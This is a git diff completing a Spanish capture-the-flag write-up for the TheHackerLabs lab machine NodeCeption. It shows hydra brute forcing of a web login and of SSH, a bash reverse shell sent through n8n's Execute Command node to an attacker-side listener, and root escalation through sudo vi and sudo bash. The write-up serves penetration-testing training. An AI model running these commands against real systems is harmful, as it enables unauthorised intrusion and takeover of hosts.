@@ -1,8 +1,8 @@
 ---
 layout: single
 title: NodeCeption - TheHackerLabs
-excerpt: "."
-date: 2025-09-19
+excerpt: "Esta fue una máquina sencilla que puede llegar a complicarse un poco. Después de realizar los escaneos, descubrimos un login en la página web activa en el puerto 5678 que resulta ser de la plataforma N8N. En la segunda página web activa en el puerto 8765, descubrimos un mensaje oculto en el código fuente, dándonos una pista sobre un usuario y el formato de la contraseña que debió crear. Aplicamos Fuzzing a ambas páginas, en la primera (donde está la plataforma N8N) no encontramos algo relevante, pero en la segunda, encontramos un login que es muy similar al login de la plataforma N8N. Decidimos aplicar fuerza bruta a ambos logins, siendo el segundo login al que encontramos la contraseña, que al entrar nos da una pista con la que logramos ganar acceso al login de la plataforma N8N. Ya dentro, descubrimos un WorkFlow que logra leer el archivo /etc/passwd, lo que nos permite identificar un usuario de la máquina víctima, al que le aplicamos fuerza bruta y logramos ganar acceso vía SSH. Ya en la máquina víctima, descubrimos que nuestro usuario tiene privilegios sobre el binario vi. Usamos la guía de GTFOBins para encontrar una forma de escalar privilegios, siendo así que nos convertimos en Root."
+date: 2025-09-20
 classes: wide
 header:
   teaser: /assets/images/THL-writeup-nodeCeption/NodeCeption.jpg
@@ -13,21 +13,43 @@ categories:
   - Easy Machine
 tags:
   - Linux
-  - 
-  - 
+  - SSH
+  - N8N Platform
+  - Web Enumeration
+  - Fuzzing
+  - BurpSuite
+  - Brute Force Attack to Web Login
+  - Analysing WorkFlow from N8N
+  - Brute Force Attack to SSH
+  - Abusing Execute Command Node from N8N
+  - Abusing Sudoers Privileges On vi Binary
+  - Privesc - Abusing Sudoers Privileges On vi Binary
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-nodeCeption/NodeCeption.jpg)
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/NodeCeption.jpg">
+</p>
 
-texto
+Esta fue una máquina sencilla que puede llegar a complicarse un poco. Después de realizar los escaneos, descubrimos un login en la página web activa en el **puerto 5678** que resulta ser de la **plataforma N8N**. En la segunda página web activa en el **puerto 8765**, descubrimos un mensaje oculto en el código fuente, dándonos una pista sobre un usuario y el formato de la contraseña que debió crear. Aplicamos **Fuzzing** a ambas páginas, en la primera (donde está la **plataforma N8N**) no encontramos algo relevante, pero en la segunda, encontramos un login que es muy similar al login de la **plataforma N8N**. Decidimos aplicar **fuerza bruta** a ambos logins, siendo el segundo login al que encontramos la contraseña, que al entrar nos da una pista con la que logramos ganar acceso al login de la **plataforma N8N**. Ya dentro, descubrimos un **WorkFlow** que logra leer el archivo `/etc/passwd`, lo que nos permite identificar un usuario de la máquina víctima, al que le aplicamos **fuerza bruta** y logramos ganar acceso vía **SSH**. Ya en la máquina víctima, descubrimos que nuestro usuario tiene privilegios sobre el **binario vi**. Usamos la **guía de GTFOBins** para encontrar una forma de escalar privilegios, siendo así que nos convertimos en **Root**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *Wappalizer*
+* *ffuf*
+* *gobuster*
+* *grep*
+* *hydra*
+* *BurpSuite*
+* *ssh*
+* *cat*
+* *tcpdump*
+* *ping*
+* *nc*
+* *bash*
+* *sudo*
+* *GTFOBins*
+* *vi*
 
 
 <br>
@@ -43,17 +65,20 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#Puerto5678">Analizando Página Web Activa en el Puerto 5678</a></li>
+				<li><a href="#Puerto8765">Analizando Página Web Activa en el Puerto 8765</a></li>
+				<li><a href="#fuzzPuerto5678">Fuzzing a Página Web del Puerto 5678</a></li>
+				<li><a href="#fuzzPuerto8765">Fuzzing a Página Web del Puerto 8765</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#FuerzaBruta">Aplicando Fuerza Bruta a Cada Login</a></li>
+				<li><a href="#WorkFlow">Analizando WorkFlow (Flujo de Trabajo) Encontrado en Plataforma n8n y Aplicando Fuerza Bruta a Servicio SSH</a></li>
+				<li><a href="#WFmalicioso">Creando un WorkFlow para Ejecutar Comandos y Obtener una Reverse Shell</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#sudo">Escalando Privilegios Abusando de Privilegios de Usuario y Aplicando Shell Escape con Binario vi</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -332,7 +357,7 @@ Revisando el código fuente, nos encontraremos un mensaje oculto de algún desar
 
 Tenemos un posible usuario y una pista sobre la contraseña que debemos usar.
 
-No encontraremos algo más aquí, entonces, aplicaremos **Fuzzing** a ambas páginas para ver que cosillas encontramos.
+No encontraremos algo más aquí, entonces, aplicaremos **Fuzzing** a ambas páginas para ver qué cosillas encontramos.
 
 <br>
 
@@ -501,16 +526,16 @@ En ambos casos se encontraron los mismos endpoints y solamente tendremos acceso 
 
 Gracias a este endpoint, podemos obtener algunas cosillas como:
 * La versión de la **plataforma n8n** que es **1.102.4**.
-* La existencia del **API público**, es decir, endpoint `/api` activo.
-* La API Key pública.
+* La existencia de **API público**, es decir, endpoint `/api` activo.
+* La **API Key pública**.
 
-Y otras cosillas más, pero para poder ver otros endpoints, necesitamos estar logueados en la **plataforma n8n**, lo cual aun no es posible.
+Y otras cosillas más, pero para poder ver otros endpoints, necesitamos estar logueados en la **plataforma n8n**, lo cual aún no es posible.
 
 <br>
 
 <h2 id="fuzzPuerto8765">Fuzzing a Página Web del Puerto 8765</h2>
 
-Al no encontrar algún directorio oculto, enfocamos la busqueda en archivos ocultos:
+Al no encontrar algún directorio oculto, enfocamos la búsqueda en archivos ocultos:
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.100.120:8765/FUZZ -t 300 -e .txt,.html,.php
 
@@ -595,19 +620,19 @@ En ambos casos encontramos un login al que podemos entrar:
 <img src="/assets/images/THL-writeup-nodeCeption/Captura10.png">
 </p>
 
-En su código fuente no encontraremos algo relevante, pero si capturamos una petición de inicio de sesión veremos que hay una relación con el login de la **plataforma n8n**:
+En su código fuente no encontraremos algo relevante, pero si capturamos una petición de inicio de sesión, veremos que hay una relación con el login de la **plataforma n8n**:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-nodeCeption/Captura11.png">
 </p>
 
-Y por supuesto, tenemos el mensaje de error:
+Y, por supuesto, tenemos el mensaje de error:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-nodeCeption/Captura12.png">
 </p>
 
-Por último, este login no parece ser vulnerable a **Inyecciones SQL**, por lo que si o si debemos darle un usuario y contraseña válidos.
+Por último, este login no parece ser vulnerable a **Inyecciones SQL**, por lo que sí o sí debemos darle un usuario y contraseña válidos.
 
 Nos queda aplicar fuerza bruta en ambos logins.
 
@@ -623,25 +648,25 @@ Nos queda aplicar fuerza bruta en ambos logins.
 
 <h2 id="FuerzaBruta">Aplicando Fuerza Bruta a Cada Login</h2>
 
-Antes de aplicar la fuerza bruta, debemos crear nuestro wordlist que debe tener las siguientes caracterizticas:
-* Debe tener minimo 8 caracteres.
-* Debe tener al menos 1 letra mayúscula.
-* Debe tener al menos 1 número.
+Antes de aplicar la fuerza bruta, debemos crear nuestro wordlist que debe tener las siguientes características:
+* Debe tener mínimo 8 caracteres.
+* Debe tener al menos una letra mayúscula.
+* Debe tener al menos un número.
 
-Podemos usar expresiones regulares contra el wordlist rockyou.txt, para obtener un nuevo wordlist que cumpla con estas caracterizticas.
+Podemos usar expresiones regulares contra el wordlist **rockyou.txt**, para obtener un nuevo wordlist que cumpla con estas características.
 
 Lo haremos con el siguiente comando:
 ```bash
 grep -P '^(?=.{8,}$)(?=.*[A-Z])(?=.*\d).*$' /usr/share/wordlists/rockyou.txt > rockyouMatch.txt
 ```
-* 
-* 
-* 
+* `(?=.{8,}$)` asegura que la longitud sea mínima de 8.
+* `(?=.*[A-Z])` exige al menos una mayúscula.
+* `(?=.*\d)` exige al menos un dígito.
 
 Entonces, para realizar el ataque a cada login, debemos de darle lo siguiente:
-* A que lugar será dirigido el ataque, un servicio, un login web, etc.
+* A qué lugar será dirigido el ataque, un servicio, un login web, etc.
 * Los parámetros que se usan para enviar el usuario y contraseña.
-* Y un filtro que indique un resultado correcto, ya sea que evite resultados con cierto texto, que solo acepte resultados que nos redirijan (obteniendo el código de estado 302), etc. Podemo usar un filtro que evite respuestas que den mensajes de error.
+* Y un filtro que indique un resultado correcto, ya sea que evite resultados con cierto texto, que solo acepte resultados que nos redirijan (obteniendo el código de estado 302), etc. Podemos usar un filtro que evite respuestas que den mensajes de error.
 
 Pero aquí nos enfrentamos a un problema, pues al aplicar la fuerza bruta al login de la página web del **puerto 5678**, nos dará falsos positivos:
 ```bash
@@ -676,13 +701,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-19 15:15:
 1 of 1 target successfully completed, 16 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-19 15:15:33
 ```
-Además, el aplicar fuerza bruta puede desactivar el login, pues detectara muchas peticiones realizadas, lo que me da a entender que hay un limite de intentos:
+
+Además, el aplicar fuerza bruta puede desactivar el login, pues detectará muchas peticiones realizadas, lo que me da a entender que hay un límite de intentos:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-nodeCeption/Captura13.png">
 </p>
 
-En cambio, la fuerza bruta se podra aplicar en el login de la página web del **puerto 8765**, sin ningún problema:
+En cambio, la fuerza bruta se podrá aplicar en el login de la página web del **puerto 8765**, sin ningún problema:
 ```bash
 hydra -l 'usuario@maildelctf.com' -P ./rockyouMatch.txt 192.168.100.120 -s 8765 http-post-form "/login.php:email=^USER^&password=^PASS^:F=Credenciales incorrectas."
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -702,29 +728,218 @@ Y si probamos esa contraseña, nos darán un mensaje interesante:
 <img src="/assets/images/THL-writeup-nodeCeption/Captura14.png">
 </p>
 
-```bash
+Esta contraseña nos servirá para ganar acceso al login de la **plataforma n8n**:
 
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura15.png">
+</p>
+
+Estamos dentro y vemos algunas cosillas, como la versión de la **plataforma n8n**, un usuario llamado **brian** y vemos un WorkFlow (flujo de trabajo).
+
+<br>
+
+<h2 id="WorkFlow">Analizando WorkFlow (Flujo de Trabajo) Encontrado en Plataforma n8n y Aplicando Fuerza Bruta a Servicio SSH</h2>
+
+Como mencioné antes, vimos un WorkFlow en el dashboard.
+
+Selecciónalo para que podamos analizarlo:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura16.png">
+</p>
+
+Hay 2 flujos ahí que parece hacer una **petición POST** para leer un archivo.
+
+En la parte central de arriba, vemos 3 secciones, pero la que nos interesa es la sección de **Executions**.
+
+Dale clic a esa sección y veremos una prueba exitosa del WorkFlow:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura17.png">
+</p>
+
+Para ver mejor cómo funcionó el WorkFlow, dale doble clic al primer flujo llamado **Webhook**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura18.png">
+</p>
+
+Observa que nos muestra una URL de prueba y en la prueba, vemos que el body usa un parámetro llamado **file** y apunta al archivo `/etc/passwd`.
+
+Sal de este flujo y entra en el segundo llamado **Leer Archivo**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura19.png">
+</p>
+
+Observa que al realizar la **petición POST**, que es el primer flujo, realiza la acción de leer un archivo en este segundo flujo. Ahí mismo podemos ver el resultado de la lectura del archivo, dándole clic al botón **View**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura20.png">
+</p>
+
+Resulta ser el archivo `/etc/passwd` de la máquina víctima, y al final vemos al **usuario thl**. Quizá le podamos aplicar fuerza bruta.
+
+Vamos a intentarlo:
+```bash
+hydra -l 'thl' -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.120 -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-20 14:56:46
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ssh://192.168.100.120:22/
+[22][ssh] host: 192.168.100.120   login: thl   password: *********
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 19 final worker threads did not complete until end.
+[ERROR] 19 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-20 14:56:53
+```
+Excelente, tenemos la contraseña.
+
+Probémosla:
+```bash
+ssh thl@192.168.100.120
+thl@192.168.100.120's password: 
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)
+...
+Last login: Fri Jul 18 13:04:48 2025
+thl@nodeception:~$ whoami
+thl
+```
+Estamos dentro.
+
+Aquí mismo encontraremos la flag del usuario:
+```bash
+thl@nodeception:~$ ls
+user.txt
+thl@nodeception:~$ cat user.txt
+...
 ```
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="WFmalicioso">Creando un WorkFlow para Ejecutar Comandos y Obtener una Reverse Shell</h2>
 
+Dentro de la **plataforma n8n**, existe un nodo llamado **Execute Command** que nos permite ejecutar comandos dentro de la máquina host.
+
+Vamos a crear un nuevo WorkFlow desde el dashboard, dale clic al botón **Create Workflow**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura21.png">
+</p>
+
+En el centro, podemos ver que se pueden añadir WorkFlows, así que dale clic ahí:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura22.png">
+</p>
+
+Ahora, en la parte derecha nos saldrá un buscador, ahí podemos buscar el nodo **Execute Command**.
+
+Búscalo y elígelo:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura23.png">
+</p>
+
+Observa que podemos ejecutar un comando solo una vez (esto se puede desactivar). Vemos el input donde podemos meter los comandos y el botón **Execute Step** que es para ejecutar el comando:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura24.png">
+</p>
+
+Además, en la parte derecha veremos el resultado del comando ejecutado.
+
+Probemos a ejecutar el comando **whoami**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura25.png">
+</p>
+
+Muy bien, funcionó y muestra que somos el **usuario thl**.
+
+Comprobemos si tenemos conexión entre la máquina víctima y nuestra máquina mandando una **traza ICMP**.
+
+Abre un capturador de **trazas ICMP** con **tcpdump**:
 ```bash
-
+tcpdump -i eth0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 ```
 
-```bash
+Ahora, haz un **ping** a tu máquina indicando un solo paquete y ejecuta el comando:
 
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura26.png">
+</p>
+
+Revisa el **tcpdump**:
+```bash
+tcpdump -i eth0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+16:19:30.567932 IP 192.168.100.120 > Tu_IP: ICMP echo request, id 16742, seq 1, length 64
+16:19:30.568712 IP Tu_IP > 192.168.100.120: ICMP echo reply, id 16742, seq 1, length 64
+...
+14 packets captured
+14 packets received by filter
+0 packets dropped by kernel
+```
+Excelente, tenemos conexión.
+
+Vamos a mandarnos una **Reverse Shell**.
+
+Abre un listener con **netcat**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
 ```
 
+Usemos el siguiente comando:
 ```bash
-
+bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'
 ```
 
-```bash
+Escribelo en el input y ejecútalo:
 
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura27.png">
+</p>
+
+Observa la **netcat**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [192.168.100.120] 37520
+bash: cannot set terminal process group (9960): Inappropriate ioctl for device
+bash: no job control in this shell
+thl@nodeception:~$ whoami
+whoami
+thl
+thl@nodeception:~$
 ```
+Estamos dentro.
+
+Obtengamos una sesión interactiva:
+```bash
+# Paso 1:
+script /dev/null -c bash
+
+# Paso 2:
+CTRL + Z
+
+# Paso 3:
+stty raw -echo; fg
+
+# Paso 4:
+reset -> xterm
+
+# Paso 5:
+export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
+```
+Puedes continuar con esta sesión o desde el **servicio SSH**.
 
 
 <br>
@@ -736,25 +951,60 @@ Y si probamos esa contraseña, nos darán un mensaje interesante:
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="sudo">Escalando Privilegios Abusando de Privilegios de Usuario y Aplicando Shell Escape con Binario vi</h2>
 
+Veamos qué privilegios tiene nuestro usuario:
 ```bash
+thl@nodeception:~$ sudo -l
+Matching Defaults entries for thl on nodeception:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
+User thl may run the following commands on nodeception:
+    (ALL) NOPASSWD: /usr/bin/vi
+    (ALL : ALL) ALL
 ```
+Tenemos privilegios para usar cualquier comando. Además, también podemos usar **vi** con privilegios.
 
+Como podemos ejecutar cualquier comando como **Root**, hay muchas posibilidades que podemos usar para escalar privilegios.
+
+La más rápida sería usar la **Bash** con privilegios:
 ```bash
-
+thl@nodeception:~$ sudo bash -p
+[sudo] password for thl: 
+root@nodeception:/home/thl# whoami
+root
 ```
+Funciona.
 
+La cuestión aquí es que se necesitó la contraseña del **usuario thl**, contraseña que ya tenemos por aplicar fuerza bruta al **servicio SSH**.
+
+Pero, digamos que únicamente tenemos privilegios sobre el **binario vi**, entonces podemos buscar en la **guía de GTFOBins** una forma de abusar de este binario:
+* <a href="https://gtfobins.github.io/gtfobins/vi/" target="_blank">GTFOBins: vi</a>
+
+Usaremos el siguiente comando:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-nodeCeption/Captura28.png">
+</p>
+
+Apliquémoslo:
 ```bash
+thl@nodeception:~$ sudo vi -c ':!/bin/bash' /dev/null
 
+root@nodeception:/home/thl# whoami
+root
 ```
+Listo, volvemos a ser **Root**.
 
+Busquemos la última flag:
 ```bash
-
+root@nodeception:/home/thl# cd /root
+root@nodeception:~# ls
+root.txt
+root@nodeception:~# cat root.txt
+...
 ```
-
-
+Y con esto, terminamos la máquina.
 
 
 <br>
@@ -764,10 +1014,12 @@ Y si probamos esa contraseña, nos darán un mensaje interesante:
 </div>
 
 
-links
+* https://secarius.fr/bugbounty/how_i_found_an_rce_seconds_after_its_publication/
+* https://gtfobins.github.io/gtfobins/vi/
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
